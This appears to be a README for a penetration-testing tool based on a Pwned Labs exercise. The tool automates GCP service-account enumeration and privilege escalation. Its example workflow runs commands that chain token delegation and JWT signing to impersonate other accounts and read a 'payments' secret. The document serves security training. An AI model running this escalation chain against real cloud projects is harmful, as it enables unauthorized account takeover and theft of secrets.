# GCP Service Account Enumeration Tool

**Author:** Tyler Ramsbey

Based on the techniques demonstrated in the Pwned Labs lab: **Pivot - GCP IAM Privilege Escalation by Chaining Permissions** ([Pwned Labs]([https://pwnedlabs.io/](https://pwnedlabs.io/labs/pivot-through-service-accounts-using-dangerous-permissions)))

---

## Description

This Python script automates several Google Cloud Platform (GCP) Service Account enumeration and privilege escalation steps, replacing manual `gcloud` and `curl` commands often used in penetration testing scenarios, particularly those involving chained permissions.

The tool allows you to:

- Authenticate using a Service Account key file or a pre-existing OAuth2 access token.
- Retrieve a project's IAM policy and extract/save Service Account emails.
- Test a set of potentially dangerous permissions (`testIamPermissions`) against a list of target Service Accounts.
- Generate access tokens for target Service Accounts via delegation (`generateAccessToken`).
- Sign JWTs as target Service Accounts and exchange them for access tokens (`signJwt`).
- List secrets within a project using Secret Manager.
- Access the content of specific secret versions.

## Prerequisites

- Python 3.6+
- Required Python libraries: `google-auth`, `google-api-python-client`, `requests`

## Installation

1. Clone or download the script:
   ```bash
   git clone https://github.com/your-repo/gcp-sa-enum-tool.git
   cd gcp-sa-enum-tool
   ```
2. Install required libraries:
   ```bash
   pip install google-auth google-api-python-client requests
   ```

## Usage

```bash
python3 gcp_sa_enum.py (--key-file <keyfile.json> | --token <access_token>) \
    --project-id <PROJECT_ID> \
    --action <ACTION> \
    [options]
```

### Arguments

**Authentication (choose one):**
- `--key-file <keyfile.json>`: Path to the Service Account JSON key file.
- `--token <access_token>`: An existing OAuth2 access token string.

**Required:**
- `--project-id <PROJECT_ID>`: Target GCP Project ID.
- `--action <ACTION>`: Enumeration action to perform (see Actions).

**Options (depending on action):**
- `--target-sas <file_or_list>`: Path to a file with Service Account emails (one per line), or a comma-separated list.
- `--delegate-sa <SA_EMAIL>`: Service Account email to use for delegation.
- `--impersonate-sa <SA_EMAIL>`: Service Account email to sign JWT as.
- `--secret-name <SECRET_ID>`: Secret name/ID to access.
- `--secret-version <VERSION>`: Secret version to access (default: `latest`).
- `--sa-output-file <FILENAME>`: Output file for discovered SAs (default: `discovered_sas.txt`).

### Actions

- `get-iam-policy`: Retrieve IAM policy, list Service Accounts, and save to `--sa-output-file`.
- `test-sa-perms`: Test `iam.serviceAccounts.getAccessToken`, `iam.serviceAccounts.signJwt`, `iam.serviceAccounts.implicitDelegation`, `iam.serviceAccounts.actAs` against target SAs.
- `generate-token-delegate`: Delegate through `--delegate-sa` to generate access tokens for target SAs.
- `sign-jwt`: Sign a JWT as `--impersonate-sa` and exchange it for an access token.
- `list-secrets`: List secrets in the project.
- `access-secret`: Access and print contents of a specific secret version.

## Output Files

- `discovered_sas.txt` (or custom via `--sa-output-file`): Discovered Service Account emails.
- `<sa_name>.token`: Access tokens generated via delegation or `sign-jwt`.

## Example Workflow

1. **Get IAM Policy & Discover SAs**  
   ```bash
   python3 gcp_sa_enum.py \
     --key-file staging-key.json \
     --project-id gr-proj-4 \
     --action get-iam-policy
   ```
2. **Test Permissions (Staging Token)**  
   ```bash
   python3 gcp_sa_enum.py \
     --key-file staging-key.json \
     --project-id gr-proj-4 \
     --action test-sa-perms \
     --target-sas discovered_sas.txt
   ```
3. **Delegate to Analytics SA**  
   ```bash
   python3 gcp_sa_enum.py \
     --key-file staging-key.json \
     --project-id gr-proj-4 \
     --action generate-token-delegate \
     --target-sas analytics@gr-proj-4.iam.gserviceaccount.com \
     --delegate-sa sql-424@gr-proj-4.iam.gserviceaccount.com
   ```
4. **Sign JWT as Platform-Middleware SA**  
   ```bash
   python3 gcp_sa_enum.py \
     --token "$(cat analytics_at_gr-proj-4.iam.gserviceaccount.com.token)" \
     --project-id gr-proj-4 \
     --action sign-jwt \
     --impersonate-sa platform-middleware@gr-proj-4.iam.gserviceaccount.com
   ```
5. **List & Access Secrets**  
   ```bash
   python3 gcp_sa_enum.py \
     --token "$(cat platform-middleware_at_gr-proj-4.iam.gserviceaccount.com.token)" \
     --project-id gr-proj-4 \
     --action list-secrets

   python3 gcp_sa_enum.py \
     --token "$(cat platform-middleware_at_gr-proj-4.iam.gserviceaccount.com.token)" \
     --project-id gr-proj-4 \
     --action access-secret \
     --secret-name payments
   ```

---

> **Disclaimer:**  
> This tool is for authorized testing and educational purposes only. Unauthorized use is illegal. Use responsibly.
